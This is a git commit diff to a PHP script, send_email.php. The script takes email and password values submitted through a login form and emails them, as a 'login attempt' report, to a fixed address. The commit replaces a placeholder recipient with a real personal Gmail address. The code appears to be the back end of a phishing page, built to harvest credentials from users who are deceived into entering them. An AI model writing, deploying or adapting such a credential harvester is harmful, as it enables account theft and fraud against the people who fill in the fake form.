f5afb9c7f54c25df2ccdac2e017c3fa62611384d
cdelgon <125076759+cdelgon@users.noreply.github.com>
2025-03-10 17:10:16 -0500

    Update send_email.php

--- send_email.php
+++ send_email.php
@@ -3,7 +3,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $email = htmlspecialchars($_POST['email']);
     $password = htmlspecialchars($_POST['password']);
 
-    $to = "TU_CORREO@gmail.com";  // Reemplaza con tu dirección de correo electrónico
+    $to = "c.d.degado.gonzalez@gmail.com";  // Reemplaza con tu dirección de correo electrónico
     $subject = "Nuevo intento de inicio de sesión";
     $message = "Se ha recibido un intento de inicio de sesión con los siguientes datos:\n\n";
     $message .= "Correo Electrónico: " . $email . "\n";
